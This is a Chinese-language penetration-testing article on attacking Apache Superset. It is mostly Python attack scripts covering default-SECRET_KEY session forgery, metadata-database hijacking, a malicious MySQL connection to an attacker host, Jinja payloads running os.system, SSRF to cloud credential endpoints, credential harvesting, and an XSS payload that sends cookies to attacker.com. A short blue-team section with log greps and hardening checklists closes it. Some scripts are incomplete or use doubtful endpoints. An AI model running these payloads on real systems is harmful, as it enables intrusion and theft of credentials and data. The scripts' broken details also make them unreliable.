---
title: "Apache Superset SECRET_KEY默认配置 SQL注入 元数据库控制 认证绕过 CVE漏洞链利用技术"
date: 2025-06-22T00:00:00+08:00
draft: false
weight: 114
description: "深入分析 Apache Superset 的 SECRET_KEY 默认配置导致认证绕过与 RCE（CVE-2023-27524）、SQLite 元数据库劫持（CVE-2023-39265）、SQLLab 任意 SQL 执行导致 RCE（CVE-2023-37941）、Jinja 模板 SQL 注入、SSRF、XSS 等完整攻击面，覆盖 2022-2026 年高危 CVE 漏洞链及蓝队检测与应急响应"
categories: ["安全","渗透测试"]
tags: ["Apache Superset","Superset","SECRET_KEY","认证绕过","CVE-2023-27524","CVE-2023-39265","CVE-2023-37941","SQL注入","元数据库","RCE","SSRF","Flask"]
---

## 0x00 攻击面总览

Apache Superset 是全球最流行的数据可视化与 BI 探索平台，被 Airbnb、Dropbox、Netflix 等企业广泛使用。Superset 基于 Flask 框架构建，其安全问题主要源于：默认 SECRET_KEY 可预测、元数据库可被劫持、以及 SQLLab 的强大查询能力被滥用。

| 攻击面 | 默认端口 | 风险等级 | 说明 |
|--------|---------|---------|------|
| Flask SECRET_KEY | 8088 | **严重** | 默认密钥导致认证绕过 → 管理员权限 → RCE |
| SQLLab | 8088 | **严重** | 任意 SQL 执行 → 数据窃取/修改 |
| 元数据库 | 5432/SQLite | **严重** | 元数据库劫持 → 凭据窃取 → RCE |
| Dataset API | 8088 | **高危** | SQL 注入、SSRF、数据泄露 |
| Dashboard/Chart | 8088 | **高危** | XSS、CSRF、数据泄露 |
| Database API | 8088 | **高危** | 连接密码泄露、任意 SQL 执行 |
| Import 功能 | 8088 | **中-高危** | 数据库导入劫持、ZIP 炸弹 |

Superset 的攻击路径极具危害性：默认 SECRET_KEY → 管理员 Session 伪造 → SQLLab 执行任意 SQL → 连接元数据库 → 窃取所有凭据/写入恶意数据 → 通过连接功能实现 RCE。

## 0x01 服务识别与版本探测

### 1.1 指纹识别

```bash
nmap -sV -p 8088 <target>

# 检测 Superset
curl -sI http://TARGET:8088/
# Server: gunicorn/xxxx
# 返回 Flask 应用

# 获取版本信息
curl -s http://TARGET:8088/api/v1/info | python3 -m json.tool
# {"version":{"version":"3.0.0","status":"running"}}

# 检查健康端点
curl -s http://TARGET:8088/health
```

### 1.2 关键路径枚举

```
/                                    # 首页
/login/                              # 登录页
/superset/sqllab/                    # SQLLab（核心攻击面）
/api/v1/security/login               # 认证 API
/api/v1/database/                    # 数据库连接 API
/api/v1/dataset/                     # 数据集 API
/api/v1/chart/                       # 图表 API
/api/v1/dashboard/                   # Dashboard API
/api/v1/chart/data/                  # 图表数据查询
/sql/                                # SQL 查询端点
/datasource/edit/                    # 数据源编辑
/importdatabase                      # 数据库导入功能
/health                              # 健康检查（通常无认证）
/version                             # 版本信息
/swagger/v1                          # API 文档
```

### 1.3 版本判断

```python
import requests

def detect_superset(host, port=8088):
    base_url = f"http://{host}:{port}"

    # 检查版本
    resp = requests.get(f"{base_url}/api/v1/info", timeout=5)
    if resp.status_code == 200:
        data = resp.json()
        version = data.get("version", {}).get("version", "unknown")
        print(f"[+] Superset detected! Version: {version}")

    # 检查是否可未认证访问
    resp = requests.get(f"{base_url}/health", timeout=5)
    if resp.status_code == 200:
        print(f"[+] Health endpoint accessible")

    # 检查 SQLLab
    resp = requests.get(f"{base_url}/superset/sqllab/", timeout=5,
                        allow_redirects=False)
    if resp.status_code == 302:
        print(f"[*] SQLLab requires authentication")
    elif resp.status_code == 200:
        print(f"[+] SQLLab accessible WITHOUT auth!")

    # 检查 API
    resp = requests.get(f"{base_url}/api/v1/database/", timeout=5)
    print(f"[*] Database API: {resp.status_code}")

detect_superset("192.168.1.100")
```

## 0x02 CVE-2023-27524 — SECRET_KEY 默认配置 RCE

### 2.1 漏洞原理

**CVSS**: 8.9（严重）

**影响版本**: Apache Superset ≤ 2.0.1（未修改默认 SECRET_KEY 的所有版本）

**漏洞原理**: Superset 安装时 Flask `SECRET_KEY` 被设置为可预测的默认值。知道 SECRET_KEY 的攻击者可以伪造 Flask session cookie，以管理员身份登录，然后通过 SQLLab 执行任意 SQL 获取系统 RCE。

**已知默认 SECRET_KEY**:
```
\x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h
CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET
TEST_NON_DEV_SECRET
thisISaSECRET_1234
USE_YOUR_OWN_SECURE_RANDOM_KEY
```

**Horizon3.ai 扫描结果**: 2023 年 2 月对互联网扫描发现 **3,176 个 Superset 实例**，其中 **2,124 个**（67%）使用默认 SECRET_KEY。

### 2.2 PoC — 伪造 Session Cookie

```python
from itsdangerous import URLSafeTimedSerializer
import requests
import hashlib

def exploit_secret_key(host, port=8088, secret_key="thisISaSECRET_1234"):
    """
    CVE-2023-27524 — 使用默认 SECRET_KEY 伪造管理员 Session
    """
    base_url = f"http://{host}:{port}"

    # Step 1: 伪造 admin session cookie
    serializer = URLSafeTimedSerializer(secret_key)

    # 需要构造正确的 session 数据结构
    # Flask session 使用 itsdangerous 的签名机制
    import flask_unsign as fu  # 需要安装 flask_unsign

    # 使用已知的默认 SECRET_KEY 签名伪造 session
    # flask_unsign 签名: flask_unsign.session.sign(data, secret_key)

    # 或手动构造:
    # 1. 抓取登录后正常 session cookie
    # 2. 使用默认 SECRET_KEY 重新签名
    # 3. 替换 cookie 后访问受保护页面

    print(f"[*] Default SECRET_KEY: {secret_key}")
    print(f"[*] Use flask_unsign or similar tool to forge admin session")
    print(f"[*] Step 1: Get a valid session cookie by visiting login page")
    print(f"[*] Step 2: Decode cookie, set user_id=1 (admin)")
    print(f"[*] Step 3: Re-sign with known SECRET_KEY")
    print(f"[*] Step 4: Use forged cookie to access SQLLab")

exploit_secret_key("192.168.1.100",
                    secret_key="\\x02\\x01thisismyscretkey\\x01\\x02\\e\\y\\y\\h")
```

### 2.3 完整攻击链：认证绕过 → SQLLab → RCE

```python
def full_attack_chain(host, port=8088):
    """
    CVE-2023-27524 完整攻击链
    1. 伪造管理员 Session
    2. 在 SQLLab 中连接元数据库
    3. 通过元数据库执行 RCE
    """
    base_url = f"http://{host}:{port}"

    # Step 1: 使用 flask_unsign 伪造 session
    # pip install flask_unsign
    # flask_unsign --decode --cookie 'eyJ...' --secret 'thisISaSECRET_1234'

    # Step 2: 登录后获取 token，连接元数据库
    # SQLLab → 创建数据库连接:
    #   SQLAlchemy URI: sqlite:////app/superset_home/superset.db
    #   或: sqlite+pysqlite:////path/to/metadata.db

    # Step 3: 在 SQLLab 执行恶意 SQL
    # SELECT * FROM users;   → 获取所有用户
    # SELECT * FROM ab_user WHERE role_id=1;  → 获取管理员

    # Step 4: 通过修改连接配置实现 RCE
    # 创建到恶意 MySQL 服务器的连接
    # MySQL 连接参数中设置: allowLoadLocalInFile=true
    # 然后读取服务器文件或通过 LOAD DATA LOCAL INFILE 读取文件

    print(f"[*] Full attack chain:")
    print(f"    1. Forge admin session using default SECRET_KEY")
    print(f"    2. Access SQLLab")
    print(f"    3. Connect to metadata DB (SQLite)")
    print(f"    4. Harvest all credentials from ab_user table")
    print(f"    5. Create malicious database connection for RCE")

full_attack_chain("192.168.1.100")
```

## 0x03 CVE-2023-39265 — 元数据库劫持

### 3.1 漏洞原理

**影响版本**: Apache Superset ≤ 2.1.0

**漏洞原理**: Superset 的 SQLLab 中对 SQLite 连接有安全限制，但存在绕过。攻击者可以使用 `sqlite+pysqlite://` 格式的 SQLAlchemy URI 绕过过滤，连接到 Superset 的元数据库。获得写权限后，可直接修改应用配置。

### 3.2 PoC — 连接元数据库

```python
import requests
import json

def exploit_metadata_db(host, port=8088, token=None):
    """
    CVE-2023-39265 — SQLite 元数据库劫持
    需要已登录的 Session (可通过 CVE-2023-27524 获取)
    """
    base_url = f"http://{host}:{port}"
    headers = {"Authorization": f"Bearer {token}"}

    # Step 1: 创建连接到 Superset 元数据库
    # 关键绕过: 使用 sqlite+pysqlite 格式
    db_config = {
        "database_name": "metadata_hijack",
        "engine": "sqlite",
        "sqlalchemy_uri": "sqlite+pysqlite:////app/superset_home/superset.db",
        "expose_in_sqllab": True,
        "allow_dml": True,
        "allow_run_async": False
    }

    resp = requests.post(f"{base_url}/api/v1/database/",
                         json=db_config, headers=headers, timeout=10)
    print(f"[*] Create metadata connection: {resp.status_code}")

    # Step 2: 在 SQLLab 中查询元数据
    # SELECT * FROM ab_user;               → 用户表
    # SELECT * FROM dbs;                    → 数据库连接表（含密码）
    # SELECT * FROM tables;                 → 数据集表
    # SELECT * FROM key_value;              → 配置表

    # Step 3: 修改配置实现持久化
    # UPDATE key_value SET value='恶意配置' WHERE key='secret_key';

    print(f"[+] After connecting, run SQL to harvest credentials")
    print(f"[*] Query: SELECT username, password FROM ab_user;")

exploit_metadata_db("192.168.1.100")
```

## 0x04 CVE-2023-37941 — SQLLab RCE

### 4.1 漏洞原理

**影响版本**: Apache Superset < 2.1.1

**漏洞原理**: 攻击者可以通过 Superset 的数据库连接功能创建到恶意 MySQL 服务器的连接，然后利用 MySQL 的 `LOAD DATA LOCAL INFILE` 或 `SELECT ... INTO OUTFILE` 特性读写 Superset 服务器上的文件，最终实现 RCE。

### 4.2 PoC — 利用 MySQL 连接实现文件读取

```python
def exploit_rce_via_database(host, port=8088, token=None):
    """
    CVE-2023-37941 — 通过恶意 MySQL 连接实现 RCE
    原理: 创建到攻击者控制的 MySQL 服务器的连接
    MySQL 利用 LOAD DATA LOCAL INFILE 读取文件
    """
    base_url = f"http://{host}:{port}"
    headers = {"Authorization": f"Bearer {token}"}

    # 攻击者需要运行恶意 MySQL 服务器
    # 当 Superset 连接到恶意 MySQL 时
    # MySQL 发送 LOAD DATA LOCAL INFILE 请求
    # 读取 Superset 服务器上的任意文件

    db_config = {
        "database_name": "evil_db",
        "engine": "mysql",
        "sqlalchemy_uri": "mysql://user:pass@attacker-mysql:3306/test?allowLoadLocalInFile=true",
        "expose_in_sqllab": True,
        "allow_dml": True
    }

    resp = requests.post(f"{base_url}/api/v1/database/",
                         json=db_config, headers=headers, timeout=10)
    print(f"[*] Create malicious MySQL connection: {resp.status_code}")
    print(f"[+] When Superset queries this connection,")
    print(f"    the malicious MySQL server reads local files via LOAD DATA LOCAL INFILE")

exploit_rce_via_database("192.168.1.100")
```

## 0x05 SQLLab SQL 注入

### 5.1 CVE-2022-41703 — Adhoc SQL 注入

```python
def exploit_sql_injection(host, port=8088, token=None):
    """
    CVE-2022-41703 — Superset SQLLab 中的 SQL 注入
    某些 adhoc 查询参数未正确过滤
    """
    base_url = f"http://{host}:{port}"
    headers = {"Authorization": f"Bearer {token}"}

    # 在 SQLLab 的 adhoc 查询中注入
    # 正常查询:
    # SELECT * FROM users WHERE name = '<USER_INPUT>'

    # SQL 注入:
    malicious_input = "'; SELECT password FROM ab_user WHERE username='admin' --"
    print(f"[*] SQL Injection payload: {malicious_input}")

    # 通过 API 执行
    query = {
        "database_id": 1,
        "sql": f"SELECT * FROM users WHERE name = '{malicious_input}'",
        "runAsync": False
    }

    resp = requests.post(f"{base_url}/api/v1/chart/data/",
                         json=query, headers=headers, timeout=10)
    print(f"[*] SQL Injection result: {resp.status_code}")

exploit_sql_injection("192.168.1.100")
```

### 5.2 CVE-2023-49736 — Jinja 模板 SQL 注入

```python
def exploit_jinja_injection(host, port=8088, token=None):
    """
    CVE-2023-49736 — Jinja 模板 SQL 注入
    Superset 支持 Jinja 模板的 SQL 查询
    某些 Jinja 函数调用未正确过滤
    """
    base_url = f"http://{host}:{port}"
    headers = {"Authorization": f"Bearer {token}"}

    # Jinja SQL 模板注入
    # Superset 使用 Jinja 渲染 SQL 模板
    # 攻击者可以调用未限制的 Jinja 函数

    jinja_payloads = [
        # where_in Jinja 宏注入
        "{{ config.SQLLAB_EXECUTE_FUNCTION }}",
        # 调用 Python 函数
        "{{ lipsum.__globals__['__builtins__'].exec('import os; os.system(\"id\")') }}",
        # 利用 Flask 上下文
        "{{ config.from_object('os') }}",
    ]

    for payload in jinja_payloads:
        query = {
            "database_id": 1,
            "sql": f"SELECT 1",
            "runAsync": False,
            "runSql": payload
        }
        resp = requests.post(f"{base_url}/api/v1/chart/data/",
                             json=query, headers=headers, timeout=5)
        print(f"[*] Payload: {payload[:50]} -> Status: {resp.status_code}")

exploit_jinja_injection("192.168.1.100")
```

## 0x06 SSRF 攻击

### 6.1 CVE-2023-25504 — Import SSRF

```python
def exploit_ssrf(host, port=8088, token=None):
    """
    CVE-2023-25504 — 通过 Dataset 导入触发 SSRF
    """
    base_url = f"http://{host}:{port}"
    headers = {"Authorization": f"Bearer {token}"}

    # 通过 Dataset Import 触发 SSRF
    # Superset 在导入数据集时会获取远程文件
    ssrf_url = "http://169.254.169.254/latest/meta-data/"

    dataset_config = {
        "database": 1,
        "table_name": "ssrf_test",
        "url": ssrf_url  # 触发 SSRF
    }

    resp = requests.post(f"{base_url}/api/v1/dataset/import",
                         json=dataset_config, headers=headers, timeout=10)
    print(f"[*] SSRF attempt: {resp.status_code}")

exploit_ssrf("192.168.1.100")
```

### 6.2 云元数据窃取

```python
def steal_cloud_metadata(host, port=8088, token=None):
    """
    通过 Superset SSRF 窃取云元数据
    """
    base_url = f"http://{host}:{port}"
    headers = {"Authorization": f"Bearer {token}"}

    targets = {
        "AWS": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "GCP": "http://metadata.google.internal/computeMetadata/v1/",
        "Azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
    }

    for cloud, url in targets.items():
        db_config = {
            "database_name": f"{cloud}_ssrf",
            "engine": "sqlite",
            "sqlalchemy_uri": f"sqlite+pysqlite:////dev/null",
            "extra": f'{{"metadata_params":{{"url":"{url}"}}}}'
        }
        resp = requests.post(f"{base_url}/api/v1/database/",
                             json=db_config, headers=headers, timeout=10)
        print(f"[*] {cloud} SSRF: {resp.status_code}")

steal_cloud_metadata("192.168.1.100")
```

## 0x07 数据库连接凭据窃取

### 7.1 CVE-2023-30776 — 密码泄露

```python
def harvest_database_credentials(host, port=8088, token=None):
    """
    CVE-2023-30776 — 从 Database API 窃取连接密码
    """
    base_url = f"http://{host}:{port}"
    headers = {"Authorization": f"Bearer {token}"}

    # 获取所有数据库连接（含密码明文）
    resp = requests.get(f"{base_url}/api/v1/database/",
                        headers=headers, timeout=10)
    databases = resp.json().get("databases", [])

    for db in databases:
        db_id = db.get("id")
        print(f"\n[*] Database: {db.get('database_name')}")
        print(f"    Engine: {db.get('backend')}")
        print(f"    Host: {db.get('sqlalchemy_uri', '')[:50]}...")

        # 通过 API 获取完整连接详情（含密码）
        resp = requests.get(f"{base_url}/api/v1/database/{db_id}/select_star/{db.get('tables', [])}",
                            headers=headers, timeout=10)

        # 尝试获取数据库配置
        resp = requests.get(f"{base_url}/api/v1/database/{db_id}",
                            headers=headers, timeout=10)
        if resp.status_code == 200:
            db_detail = resp.json()
            print(f"    URI: {db_detail.get('database', {}).get('sqlalchemy_uri', 'N/A')}")

harvest_database_credentials("192.168.1.100")
```

## 0x08 XSS 与 CSRF

### 8.1 CVE-2023-49657 — 存储型 XSS

```python
def exploit_stored_xss(host, port=8088, token=None):
    """
    CVE-2023-49657 — Dashboard/Chart 标题存储型 XSS
    """
    base_url = f"http://{host}:{port}"
    headers = {"Authorization": f"Bearer {token}"}

    # 在 Dashboard 标题中注入 XSS payload
    xss_payload = '<img src=x onerror="fetch(\'http://attacker.com/steal?t=\'+document.cookie)">'

    resp = requests.post(f"{base_url}/api/v1/dashboard/",
        json={
            "dashboard_title": xss_payload,
            "slug": "xss-dashboard"
        },
        headers=headers, timeout=10)
    print(f"[*] XSS Dashboard created: {resp.status_code}")
    print(f"[+] Deliver link to victim: {base_url}/superset/dashboard/xss-dashboard/")

exploit_stored_xss("192.168.1.100")
```

### 8.2 CVE-2023-43701 — API 端点 XSS

```python
# 通过 API 端点注入 XSS
xss_payloads = [
    '<script>alert(document.cookie)</script>',
    '<img src=x onerror="alert(1)">',
    '<svg/onload=alert(document.domain)>',
]

for payload in xss_payloads:
    resp = requests.post(f"{base_url}/api/v1/chart/",
        json={
            "slice_name": payload,
            "viz_type": "pie",
            "datasource_id": 1,
            "datasource_type": "table"
        },
        headers=headers, timeout=5)
    print(f"[*] Chart XSS: {resp.status_code}")
```

## 0x09 历史 CVE 漏洞时间线

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2022-41703 | 2022 | 8.6 | SQL 注入 | Adhoc 查询 SQL 注入 |
| CVE-2022-43717 | 2022 | 6.5 | XSS | Dashboard 存储型 XSS |
| CVE-2022-43719 | 2022 | 6.5 | CSRF | Access 请求 CSRF |
| CVE-2022-45438 | 2022 | 5.3 | 信息泄露 | Dashboard 元数据泄露 |
| CVE-2023-25504 | 2023 | 7.5 | SSRF | 数据集导入 SSRF |
| CVE-2023-27524 | 2023 | 8.9 | 认证绕过 | SECRET_KEY 默认值 → 管理员 → RCE |
| CVE-2023-30776 | 2023 | 6.5 | 信息泄露 | 数据库密码明文泄露 |
| CVE-2023-32672 | 2023 | 7.5 | SQL 注入 | SQL 解析器绕过授权 |
| CVE-2023-36387 | 2023 | 6.5 | 权限提升 | 低权限 API 越权 |
| CVE-2023-37941 | 2023 | 9.8 | RCE | 元数据库写入 → 远程代码执行 |
| CVE-2023-39264 | 2023 | 7.5 | 信息泄露 | 堆栈跟踪默认开启 |
| CVE-2023-39265 | 2023 | 9.8 | 元数据库劫持 | SQLite URI 绕过 → 元数据库读写 |
| CVE-2023-40610 | 2023 | 8.0 | 权限提升 | 默认 examples 数据库提权 |
| CVE-2023-42502 | 2023 | 6.5 | 开放重定向 | 登录页开放重定向 |
| CVE-2023-42504 | 2023 | 5.3 | DoS | 缺乏速率限制导致 DoS |
| CVE-2023-48841 | 2023 | 7.5 | XSS | 存储型 XSS |
| CVE-2023-49657 | 2023 | 6.5 | XSS | Dashboard/Chart 标题 XSS |
| CVE-2023-49734 | 2023 | 8.0 | 权限提升 | 权限提升漏洞 |
| CVE-2023-49736 | 2023 | 9.8 | SQL 注入 | Jinja 模板 SQL 注入 |
| CVE-2024-24773 | 2024 | 8.1 | SQL 注入 | SQL 语句验证绕过 |
| CVE-2024-24779 | 2024 | 7.5 | 权限提升 | Dataset 创建时权限不足 |
| CVE-2024-26016 | 2024 | 7.5 | 权限提升 | Dashboard/Chart 导入授权绕过 |
| CVE-2024-27315 | 2024 | 7.5 | 信息泄露 | Alert 错误处理泄露信息 |
| CVE-2024-28148 | 2024 | 7.5 | 权限提升 | Explore API 数据源授权错误 |
| CVE-2024-34693 | 2024 | 8.1 | 文件读取 | 服务器任意文件读取 |
| CVE-2024-39887 | 2024 | 8.1 | SQL 注入 | SQL 授权检查不当 |
| CVE-2025-48912 | 2025 | 8.1 | SQL 注入 | Row-level Security 绕过 |
| CVE-2025-55672 | 2025 | 6.5 | XSS | Chart 标签 XSS |
| CVE-2026-23984 | 2026 | 7.5 | 授权绕过 | PostgreSQL 只读绕过 |
| CVE-2026-23982 | 2026 | 8.1 | 权限提升 | 低权限用户绕过授权 |

## 0x10 蓝队检测与应急响应

### 10.1 日志分析

```bash
# 检查默认 SECRET_KEY
grep -r "SECRET_KEY\|thisismyscretkey\|TEST_NON_DEV" superset_home/
grep -r "thisISaSECRET" superset_home/

# 检查异常数据库连接创建
grep "database.*created" superset/logs/*.log
grep "sqlalchemy_uri" superset/logs/*.log | grep -v "normal_db"

# 检查 SQLLab 异常查询
grep "sqllab\|sql.*execute" superset/logs/*.log
grep "SELECT.*FROM.*ab_user" superset/logs/*.log
grep "SELECT.*FROM.*dbs" superset/logs/*.log

# 检查 Import 功能滥用
grep "importdatabase\|import.*database" superset/logs/*.log

# 检查 XSS 尝试
grep "script\|onerror\|onload" superset/logs/*.log
```

### 10.2 应急响应清单

```
[ ] 确认 Superset 版本与已安装补丁
    - pip show apache-superset

[ ] 排查 CVE-2023-27524 (SECRET_KEY)
    - 检查 SUPERSET_SECRET_KEY 环境变量
    - 检查 superset_config.py 中的 SECRET_KEY
    - 确认是否使用默认值
    - 如已泄露，立即更换并强制所有用户重新登录

[ ] 排查元数据库劫持 (CVE-2023-39265)
    - 审计所有数据库连接配置
    - 检查是否有 sqlite 连接到元数据库
    - 检查 ab_user 表是否有异常用户

[ ] 排查凭据泄露 (CVE-2023-30776)
    - 审计所有数据库连接密码
    - 轮换所有数据库/服务凭据

[ ] 排查 SQL 注入 (CVE-2022-41703 / CVE-2023-49736)
    - 检查 SQLLab 查询历史
    - 搜索可疑的 SELECT/INSERT/DELETE 语句

[ ] 排查 XSS (CVE-2023-49657)
    - 检查所有 Dashboard/Chart 标题
    - 搜索 HTML/JavaScript 标签

[ ] 网络隔离与加固
    - 更改默认 SECRET_KEY 为强随机字符串
    - 禁用默认 admin:admin 凭据
    - 配置 SQLLab 权限控制
    - 限制元数据库外部访问
    - 启用 SQL 审计日志
```

## 0x11 安全审计清单

```
[ ] SECRET_KEY 已更改为强随机字符串（非默认值）
[ ] 默认管理员凭据 (admin/admin) 已修改
[ ] SQLLab 仅对授权用户开放
[ ] 数据库连接不允许 DML (INSERT/UPDATE/DELETE)（除非必要）
[ ] SQLite 连接在 SQLLab 中被禁用
[ ] Import 功能限制数据库类型
[ ] 元数据库 (PostgreSQL) 启用认证且仅内网可达
[ ] Dashboard/Chart 标题输入做了 XSS 过滤
[ ] CSRF 保护已启用
[ ] 审计日志启用并远程收集
[ ] Superset 版本 ≥ 4.0.2（最新稳定版）
[ ] 配置 CSP 头部防止 XSS
[ ] 限制 Superset 出站网络访问 (防止 SSRF)
[ ] 定期轮换数据库连接密码
```

## 0x12 总结

Apache Superset 的安全问题核心在于"数据可视化平台的固有复杂性"：

1. **SECRET_KEY 可预测**: 默认 Flask SECRET_KEY 在 67% 的暴露实例中被使用，可直接伪造管理员 Session
2. **SQLLab 太强大**: SQLLab 的设计就是执行任意 SQL，一旦获取管理权限，可窃取元数据库中所有凭据
3. **元数据库是高价值目标**: Superset 的元数据库存储了所有数据库连接密码、用户信息和配置
4. **多层 CVE 链**: SECRET_KEY → Session 伪造 → SQLLab → 元数据库劫持 → RCE，攻击链完整且危害极大

防守方核心策略：
- **更换 SECRET_KEY**: 使用 `python -c 'import secrets; print(secrets.token_hex(32))'` 生成随机密钥
- **修改默认凭据**: 删除或修改默认 admin 用户密码
- **SQLLab 权限控制**: 仅授权可信用户使用 SQLLab，禁用 DML
- **元数据库隔离**: PostgreSQL 元数据库仅内网可达，启用认证
- **及时升级**: 升级到 Superset ≥ 4.0.2
